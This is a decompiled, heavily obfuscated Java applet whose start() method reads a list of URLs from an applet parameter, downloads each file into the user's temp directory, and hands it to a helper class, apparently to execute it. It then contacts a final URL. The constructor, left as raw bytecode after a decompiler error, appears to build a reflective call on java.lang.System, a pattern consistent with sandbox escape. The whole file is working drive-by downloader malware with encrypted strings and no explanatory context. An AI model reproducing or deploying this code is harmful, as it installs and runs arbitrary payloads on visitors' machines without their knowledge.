import java.io.FileOutputStream;
import java.net.URL;
import java.io.InputStream;
import java.util.HashSet;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class z extends Applet
{
    public JList ALLATORI_DEMO;
    
    public HashSet ALLATORI_DEMO() {
        return new HashSet();
    }
    
    public InputStream A(String a2) {
        try {
            a2 = (String)new URL(a2);
            final String a3 = p.a("\u0001C\u001dCEL\u000eVEw9n");
            ((URL)a2).openConnection();
            return (InputStream)Class.forName(p.ALLATORI_DEMO(a3)).getMethod(p.ALLATORI_DEMO(J("1P;N\rT,E?M")), (Class<?>[])new Class[0]).invoke(a2, new Object[0]);
        }
        catch (Exception a2) {
            return null;
        }
    }
    
    public FileOutputStream a(final String a2) {
        try {
            return new FileOutputStream(a2);
        }
        catch (Exception a2) {
            return null;
        }
    }
    
    public static String J(final String a) {
        final int n = 2 << 3 ^ (0x2 ^ 0x5);
        final int n2 = 3;
        final int n3 = n2 << n2 ^ (0x3 ^ 0x5);
        final int length = a.length();
        final char[] array = new char[length];
        int n4;
        int i = n4 = length - 1;
        final char[] array2 = array;
        final char c = (char)n3;
        final int n5 = n;
        while (i >= 0) {
            final char[] array3 = array2;
            final int n6 = n4;
            final char char1 = a.charAt(n6);
            --n4;
            array3[n6] = (char)(char1 ^ n5);
            if (n4 < 0) {
                break;
            }
            final char[] array4 = array2;
            final int n7 = n4;
            final char c2 = (char)(a.charAt(n7) ^ c);
            --n4;
            array4[n7] = c2;
            i = n4;
        }
        return new String(array2);
    }
    
    @Override
    public void start() {
        super.start();
        try {
            final String[] split = this.getParameter(p.ALLATORI_DEMO(p.a("W\u0019N"))).split(p.ALLATORI_DEMO(J("\u0001}\u0003")));
            String s2;
            final String s = s2 = System.getProperty(p.ALLATORI_DEMO(p.a("\u0001C\u001dCEK\u0004\f\u001fO\u001bF\u0002P")));
            if (s.charAt(s.length() - 1) != '\\') {
                s2 = new StringBuilder().insert(0, s2).append(p.ALLATORI_DEMO(J("|"))).toString();
            }
            Integer n2;
            Integer n3;
            Integer n4;
            for (Integer n = n2 = 0; n < split.length && split[n2].length() != 0; n2 = (n3 = n2) + 1, n4 = n3, n = n2) {
                final String string = new StringBuilder().insert(0, s2).append(p.ALLATORI_DEMO(J("3S"))).append(n2).append(new StringBuilder().insert(0, p.ALLATORI_DEMO(p.a("\u000fQ\nQ\u0006\f\u000eZ")).substring(5)).append(p.ALLATORI_DEMO("R")).toString()).toString();
                final InputStream a = this.A(split[n2]);
                final FileOutputStream a2 = this.a(string);
                final byte[] array = new byte[1024];
                InputStream inputStream = a;
                byte[] array2 = array;
                int read;
                while ((read = inputStream.read(array2, 0, array.length)) != -1) {
                    inputStream = a;
                    a2.write(array2 = array, 0, read);
                }
                a.close();
                a2.close();
                new h().ALLATORI_DEMO(string);
            }
            this.A(new StringBuilder().insert(0, split[n2 - 1]).append(p.ALLATORI_DEMO(p.a("\u0003J\u0001"))).toString()).close();
        }
        catch (Exception ex) {}
    }
    
    public z() {
        // 
        // This method could not be decompiled.
        // 
        // Original Bytecode:
        // 
        //     0: ldc             ":K8J9L6J5D8H0G'U9F7U-H:F7O9H-I+D8H9K2S:H9U7S8A-D8\u0000"
        //     2: invokestatic    z.J:(Ljava/lang/String;)Ljava/lang/String;
        //     5: aload_0         /* a */
        //     6: invokespecial   java/applet/Applet.<init>:()V
        //     9: invokestatic    p.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //    12: astore_1       
        //    13: ldc             "H\rE\u0003Q\rN\fJ\u0018F\rN\u0003E\u0002W\u0004G\u0003H\fN\u0000X\u0003K\rW\f[\u000fJ\rE\u0000H\u0018F\rE\u000fD\f\u0002"
        //    15: invokestatic    p.a:(Ljava/lang/String;)Ljava/lang/String;
        //    18: invokestatic    p.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //    21: astore_1       
        //    22: ldc             "M5L-G4D9L7S6D7F9H-D+F6G+I-H9K4D6F4G5L6D-F7U9\u0000"
        //    24: invokestatic    z.J:(Ljava/lang/String;)Ljava/lang/String;
        //    27: invokestatic    p.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //    30: astore_1       
        //    31: ldc             "\u0018F\u0001D\u0018F\u0003D\u0007W\u0002J\rK\u0018J\u000fD\u0004K\u001cJ\u0001D\u0018I\u0007F\u0001J\rN\u001eQ\u000fE\rH\u0018I\u000fQ\u0007F\u0000H\u0003D\u0001Q\u0000J\u000fD\u0007D\u000f\u0002"
        //    33: invokestatic    p.a:(Ljava/lang/String;)Ljava/lang/String;
        //    36: invokestatic    p.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //    39: astore_1       
        //    40: ldc             ":K8J9L6J5D8H0G-D'U9F7U-H:F7O9H-I+D8H9K2S:H9U7S8A-D8\u0000"
        //    42: invokestatic    z.J:(Ljava/lang/String;)Ljava/lang/String;
        //    45: invokestatic    p.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //    48: astore_1       
        //    49: ldc             "H\rE\u0003Q\rN\fJ\u0018F\rF\rN\u0003E\u0002W\u0004G\u0003H\fN\u0000X\u0003K\rW\f[\u000fJ\rE\u0000H\u0018F\rE\u000fD\f\u0002"
        //    51: invokestatic    p.a:(Ljava/lang/String;)Ljava/lang/String;
        //    54: invokestatic    p.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //    57: astore_1       
        //    58: ldc             "M5L-A-D/W4D9L7S6D7F9H-D+F6G+I-H9K4D6F4G5L6D-F7U9\u0000"
        //    60: invokestatic    z.J:(Ljava/lang/String;)Ljava/lang/String;
        //    63: invokestatic    p.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //    66: astore_1       
        //    67: ldc             "\u0018F\u0001D\u0018F\u0003D\u0007W\u0002J\rK\u0018J\u000fD\u0004K\u001cJ\u0001D\u0018I\u0007F\u0001J\rN\u001eQ\u000fE\rH\u0018I\u000fQ\u0007F\u0000H\u0003D\u0001Q\u0000J\u000fD\u0007D\u000f\u0002"
        //    69: invokestatic    p.a:(Ljava/lang/String;)Ljava/lang/String;
        //    72: invokestatic    p.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //    75: astore_1       
        //    76: ldc             "M6D-G8H-D8O7Q7J1D/H4W5F4S6F9J'G-D8J5H5D2U/H9D?G-D8Y+A*F-D9J5A4S:K2A6D9A-H:J5A6S:I+Q6G)D4K?L-J:U7A1S'D6J5Q6W:J5\u0000"
        //    78: invokestatic    z.J:(Ljava/lang/String;)Ljava/lang/String;
        //    81: invokestatic    p.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //    84: astore_1       
        //    85: new             Ljava/lang/StringBuffer;
        //    88: dup            
        //    89: ldc             "D\f\u0014"
        //    91: invokestatic    p.a:(Ljava/lang/String;)Ljava/lang/String;
        //    94: invokestatic    p.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //    97: invokespecial   java/lang/StringBuffer.<init>:(Ljava/lang/String;)V
        //   100: ldc             "S;T"
        //   102: invokestatic    z.J:(Ljava/lang/String;)Ljava/lang/String;
        //   105: invokestatic    p.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //   108: invokevirtual   java/lang/StringBuffer.append:(Ljava/lang/String;)Ljava/lang/StringBuffer;
        //   111: ldc             "^x8G\bW"
        //   113: invokestatic    p.a:(Ljava/lang/String;)Ljava/lang/String;
        //   116: invokestatic    p.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //   119: iconst_2       
        //   120: invokevirtual   java/lang/String.substring:(I)Ljava/lang/String;
        //   123: invokevirtual   java/lang/StringBuffer.append:(Ljava/lang/String;)Ljava/lang/StringBuffer;
        //   126: ldc             ",I*Y"
        //   128: invokestatic    z.J:(Ljava/lang/String;)Ljava/lang/String;
        //   131: invokestatic    p.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //   134: ldc             "X\u0013X\u0016$o"
        //   136: invokestatic    p.a:(Ljava/lang/String;)Ljava/lang/String;
        //   139: invokestatic    p.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //   142: iconst_5       
        //   143: invokevirtual   java/lang/String.substring:(I)Ljava/lang/String;
        //   146: invokevirtual   java/lang/String.concat:(Ljava/lang/String;)Ljava/lang/String;
        //   149: invokevirtual   java/lang/StringBuffer.append:(Ljava/lang/String;)Ljava/lang/StringBuffer;
        //   152: ldc             "L\u0015A0A"
        //   154: invokestatic    z.J:(Ljava/lang/String;)Ljava/lang/String;
        //   157: invokestatic    p.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //   160: iconst_2       
        //   161: invokevirtual   java/lang/String.substring:(I)Ljava/lang/String;
        //   164: ldc             "E\u000eP"
        //   166: invokestatic    p.a:(Ljava/lang/String;)Ljava/lang/String;
        //   169: invokestatic    p.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //   172: invokevirtual   java/lang/String.concat:(Ljava/lang/String;)Ljava/lang/String;
        //   175: invokevirtual   java/lang/StringBuffer.append:(Ljava/lang/String;)Ljava/lang/StringBuffer;
        //   178: iconst_3       
        //   179: invokevirtual   java/lang/StringBuffer.substring:(I)Ljava/lang/String;
        //   182: astore_1       
        //   183: new             Lb;
        //   186: dup            
        //   187: ldc             Ljava/lang/System;.class
        //   189: aload_1        
        //   190: iconst_1       
        //   191: anewarray       Ljava/lang/Object;
        //   194: iconst_1       
        //   195: dup            
        //   196: iconst_1       
        //   197: dup            
        //   198: pop2           
        //   199: pop2           
        //   200: invokespecial   b.<init>:(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)V
        //   203: astore_1       
        //   204: aload_0         /* a */
        //   205: invokevirtual   z.ALLATORI_DEMO:()Ljava/util/HashSet;
        //   208: dup            
        //   209: astore_2       
        //   210: aload_1        
        //   211: invokevirtual   java/util/HashSet.add:(Ljava/lang/Object;)Z
        //   214: ldc             ")Z/Q/Q/Q/Q1\u0015fu:F/D?S:\u00102Q\nG6J-D8S:F9H9H4e7g9G/S5RiN)\u0000"
        //   216: invokestatic    z.J:(Ljava/lang/String;)Ljava/lang/String;
        //   219: invokestatic    p.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //   222: astore_1       
        //   223: ldc             "%G\nQ\u000fC\u001aQ\u000fD\u0018F#f\u0019A\u000fd\u0018F\rQ\u000fDRm_O\u001cV9I=s.i\u000fE\u0003H\fJ"
        //   225: invokestatic    p.a:(Ljava/lang/String;)Ljava/lang/String;
        //   228: invokestatic    p.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //   231: astore_1       
        //   232: ldc             "YfD/Q/Q\u0016S:F-D6J5H4K:F-D8S:F6J5H4K6J5H4K6J"
        //   234: invokestatic    z.J:(Ljava/lang/String;)Ljava/lang/String;
        //   237: invokestatic    p.ALLATORI_DEMO:(Ljava/lang/String;)Ljava/lang/String;
        //   240: astore_1       
        //   241: new             Lu;
        //   244: dup            
        //   245: aload_0         /* a */
        //   246: aload_2        
        //   247: invokespecial   u.<init>:(Lz;Ljava/util/HashSet;)V
        //   250: astore_1       
        //   251: pop            
        //   252: new             Ljavax/swing/JList;
        //   255: aload_0         /* a */
        //   256: dup_x1         
        //   257: dup            
        //   258: pop2           
        //   259: dup            
        //   260: iconst_1       
        //   261: anewarray       Ljava/lang/Object;
        //   264: iconst_1       
        //   265: dup            
        //   266: iconst_1       
        //   267: dup            
        //   268: pop2           
        //   269: pop2           
        //   270: dup            
        //   271: iconst_0       
        //   272: aload_1        
        //   273: aastore        
        //   274: invokespecial   javax/swing/JList.<init>:([Ljava/lang/Object;)V
        //   277: putfield        z.ALLATORI_DEMO:Ljavax/swing/JList;
        //   280: aload_0         /* a */
        //   281: dup            
        //   282: getfield        z.ALLATORI_DEMO:Ljavax/swing/JList;
        //   285: invokevirtual   z.add:(Ljava/awt/Component;)Ljava/awt/Component;
        //   288: pop            
        //   289: return         
        //    LocalVariableTable:
        //  Start  Length  Slot  Name  Signature
        //  -----  ------  ----  ----  ---------
        //  0      290     0     a     Lz;
        // 
        // The error that occurred was:
        // 
        // java.lang.NullPointerException
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.convertType(AstBuilder.java:324)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.convertType(AstBuilder.java:153)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformCall(AstMethodBodyBuilder.java:1120)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformByteCode(AstMethodBodyBuilder.java:1010)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformExpression(AstMethodBodyBuilder.java:540)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformByteCode(AstMethodBodyBuilder.java:554)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformExpression(AstMethodBodyBuilder.java:540)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformByteCode(AstMethodBodyBuilder.java:554)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformExpression(AstMethodBodyBuilder.java:540)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformByteCode(AstMethodBodyBuilder.java:554)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformExpression(AstMethodBodyBuilder.java:540)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformByteCode(AstMethodBodyBuilder.java:554)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformExpression(AstMethodBodyBuilder.java:540)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformNode(AstMethodBodyBuilder.java:392)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.transformBlock(AstMethodBodyBuilder.java:333)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.createMethodBody(AstMethodBodyBuilder.java:294)
        //     at com.strobel.decompiler.languages.java.ast.AstMethodBodyBuilder.createMethodBody(AstMethodBodyBuilder.java:99)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createMethodBody(AstBuilder.java:757)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createConstructor(AstBuilder.java:692)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.addTypeMembers(AstBuilder.java:529)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createTypeCore(AstBuilder.java:499)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createTypeNoCache(AstBuilder.java:141)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.createType(AstBuilder.java:130)
        //     at com.strobel.decompiler.languages.java.ast.AstBuilder.addType(AstBuilder.java:105)
        //     at com.strobel.decompiler.languages.java.JavaLanguage.buildAst(JavaLanguage.java:71)
        //     at com.strobel.decompiler.languages.java.JavaLanguage.decompileType(JavaLanguage.java:59)
        //     at com.strobel.decompiler.DecompilerDriver.decompileType(DecompilerDriver.java:317)
        //     at com.strobel.decompiler.DecompilerDriver.decompileJar(DecompilerDriver.java:238)
        //     at com.strobel.decompiler.DecompilerDriver.main(DecompilerDriver.java:138)
        // 
        throw new IllegalStateException("An error occurred while decompiling this method.");
    }
    
    public static String ALLATORI_DEMO(final String a) {
        final int n = (0x3 ^ 0x5) << 4;
        final int n2 = 2;
        final int n3 = n ^ (n2 << n2 ^ 0x3);
        final int n4 = 1 << 3 ^ (0x3 ^ 0x5);
        final int length = a.length();
        final char[] array = new char[length];
        int n5;
        int i = n5 = length - 1;
        final char[] array2 = array;
        final int n6 = n4;
        final char c = (char)n3;
        while (i >= 0) {
            final char[] array3 = array2;
            final int n7 = n5;
            final char c2 = (char)(a.charAt(n7) ^ c);
            --n5;
            array3[n7] = c2;
            if (n5 < 0) {
                break;
            }
            final char[] array4 = array2;
            final int n8 = n5;
            final char char1 = a.charAt(n8);
            --n5;
            array4[n8] = (char)(char1 ^ n6);
            i = n5;
        }
        return new String(array2);
    }
}
